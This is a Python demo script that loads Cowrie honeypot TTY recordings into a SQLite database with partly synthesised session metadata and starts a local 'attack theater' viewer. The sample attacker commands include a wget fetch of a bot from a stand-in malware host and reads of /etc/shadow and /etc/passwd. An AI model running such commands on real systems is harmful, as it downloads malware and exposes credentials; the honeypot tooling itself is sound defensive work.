"""
Set up theater.db from real TTY files and start the attack theater on port 9090.
Run from the repo root or the demo/ directory.
"""
import json
import os
import sqlite3
import struct
import subprocess
import sys
import time
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

BASE        = Path(__file__).parent
TTY_DIR     = BASE / "cowrie_logs/hop1/lib/cowrie/tty"
DATA_DIR    = BASE / "data"
THEATER_DIR = BASE.parent / "attack_theater"
THEATER_PORT = 9090

DATA_DIR.mkdir(parents=True, exist_ok=True)

# ── Parse a TTY binary to extract session timing ──────────────────────────────

HEADER_FMT  = "<iLiiLL"
HEADER_SIZE = struct.calcsize(HEADER_FMT)

def _parse_tty(path: Path):
    """Return (start_epoch, end_epoch, frame_count) or None if unreadable."""
    try:
        raw = path.read_bytes()
    except OSError:
        return None
    offset = 0
    times = []
    while offset + HEADER_SIZE <= len(raw):
        op, _, length, direction, sec, usec = struct.unpack_from(HEADER_FMT, raw, offset)
        offset += HEADER_SIZE + length
        if op == 3:
            times.append(sec + usec / 1e6)
    if not times:
        return None
    return times[0], times[-1], len(times)


# ── Fake session metadata keyed by TTY sha256 ─────────────────────────────────
# (pulled from the real cowrie.json where available; rest synthesised)

_SESSIONS = {
    "8e144b92a86e12a9683b04e866ee0b92ac523702bda5f524eb9c1fa82884d7ae": {
        "session_id": "8e144b92demo1",
        "src_ip":     "45.33.32.156",
        "country":    "United States",
        "country_code": "US",
        "asn_org":    "AS63949 Akamai Connected Cloud",
        "lat": 37.7510, "lon": -97.8220,
        "hop": 1,
        "commands": ["ls", "top", "ls -la", "vim", "cat clean.sh", "cat redtail.arm7",
                     "ssh root@172.10.0.11 -p 2222", "docker ps", "docker stop", "ip a"],
    },
    "f1e1e6cb6781a2538d4d1dbfaace204581418eb6beef04e3e723cb11a0d29dc3": {
        "session_id": "f1e1e6cbdemo2",
        "src_ip":     "185.220.101.47",
        "country":    "Germany",
        "country_code": "DE",
        "asn_org":    "AS200651 Alexhost SRL",
        "lat": 51.2993, "lon": 9.4910,
        "hop": 1,
        "commands": ["uname -a", "id", "cat /etc/passwd", "wget http://malware.host/bot"],
    },
    "cef8b4199fc52c8b4848048df7abc5b97c56696f8dadb829066b4cd5245447dd": {
        "session_id": "cef8b419demo3",
        "src_ip":     "91.219.236.179",
        "country":    "Russia",
        "country_code": "RU",
        "asn_org":    "AS44050 Petersburg Internet Network Ltd.",
        "lat": 59.8944, "lon": 30.2642,
        "hop": 1,
        "commands": ["uname -a", "ps aux", "cat /etc/crontab"],
    },
    "527b0be8e798973d924cccb33039022b41328e62cda3009cda05ccb38e1727d7": {
        "session_id": "527b0be8demo4",
        "src_ip":     "194.165.16.11",
        "country":    "Netherlands",
        "country_code": "NL",
        "asn_org":    "AS206728 Media Land LLC",
        "lat": 52.3824, "lon": 4.8995,
        "hop": 1,
        "commands": ["cat /etc/shadow", "cat /etc/passwd"],
    },
    "2dbd968a2aa4167ab5194b38bd0abff2998ab0742b3b7b22d21a0d7a984e3117": {
        "session_id": "2dbd968ademo5",
        "src_ip":     "193.32.162.88",
        "country":    "Sweden",
        "country_code": "SE",
        "asn_org":    "AS394711 Limenet",
        "lat": 59.3326, "lon": 18.0649,
        "hop": 2,
        "commands": ["id", "whoami"],
    },
}

# ── Build theater.db ──────────────────────────────────────────────────────────

db_path = DATA_DIR / "theater.db"
db_path.unlink(missing_ok=True)
for wal in (DATA_DIR/"theater.db-shm", DATA_DIR/"theater.db-wal"):
    wal.unlink(missing_ok=True)

conn = sqlite3.connect(str(db_path))
conn.execute("""
CREATE TABLE sessions (
    session_id TEXT PRIMARY KEY, hop INTEGER, src_ip TEXT,
    country TEXT, country_code TEXT, asn_org TEXT,
    lat REAL, lon REAL, start_time REAL, end_time REAL,
    command_count INTEGER DEFAULT 0, duration REAL,
    tty_file_path TEXT, is_interesting INTEGER DEFAULT 0,
    commands_json TEXT DEFAULT '[]'
)
""")
conn.execute("CREATE INDEX idx_interesting ON sessions (is_interesting)")
conn.execute("CREATE INDEX idx_start_time  ON sessions (start_time)")

inserted = 0
for tty_path in sorted(TTY_DIR.iterdir()):
    sha = tty_path.name
    timing = _parse_tty(tty_path)
    if timing is None:
        print(f"  skip {sha[:16]}… (unreadable)")
        continue
    start_ts, end_ts, nframes = timing
    duration = end_ts - start_ts
    meta = _SESSIONS.get(sha, {
        "session_id":   sha[:12] + "demo",
        "src_ip":       "1.2.3.4",
        "country":      "Unknown",
        "country_code": "",
        "asn_org":      "Unknown",
        "lat": None, "lon": None,
        "hop": 1,
        "commands": [],
    })
    conn.execute("""
        INSERT INTO sessions VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
    """, (
        meta["session_id"], meta["hop"], meta["src_ip"],
        meta["country"], meta["country_code"], meta["asn_org"],
        meta["lat"], meta["lon"],
        start_ts, end_ts,
        len(meta.get("commands", [])), duration,
        str(tty_path), 1,
        json.dumps(meta.get("commands", [])),
    ))
    print(f"  + {meta['session_id']:20s}  {meta['src_ip']:18s}  {duration:.0f}s  {nframes} frames  ({sha[:16]}…)")
    inserted += 1

conn.commit()
conn.close()
print(f"\n[DB] {inserted} sessions written to {db_path}")

# ── Start attack_theater ──────────────────────────────────────────────────────

DEMO_PASSWORD = "violet"

env = {
    **os.environ,
    "DB_PATH":          str(db_path),
    "MMDB_PATH":        "/nonexistent",
    "HOST":             "127.0.0.1",
    "PORT":             str(THEATER_PORT),
    "PYTHONPATH":       str(THEATER_DIR),
    "THEATER_PASSWORD": DEMO_PASSWORD,
}

venv_python = THEATER_DIR / ".venv/bin/python3"
python_bin  = str(venv_python) if venv_python.exists() else sys.executable

print(f"\n[Server] Starting attack_theater on http://127.0.0.1:{THEATER_PORT}/")
print(f"         Python: {python_bin}")
print(f"\n  Open in browser:  http://127.0.0.1:{THEATER_PORT}/")
print(f"  Login:            username=anything  password={DEMO_PASSWORD}")
print(f"\n  Press Ctrl+C to stop\n")

proc = subprocess.Popen(
    [python_bin, "-m", "app.main"],
    cwd=str(THEATER_DIR),
    env=env,
)

# Wait until ready
for _ in range(40):
    time.sleep(0.25)
    try:
        urllib.request.urlopen(f"http://127.0.0.1:{THEATER_PORT}/", timeout=1)
        print(f"[Server] Ready → http://127.0.0.1:{THEATER_PORT}/\n")
        break
    except Exception:
        pass

try:
    proc.wait()
except KeyboardInterrupt:
    proc.terminate()
    proc.wait()
    print("\n[Server] Stopped.")
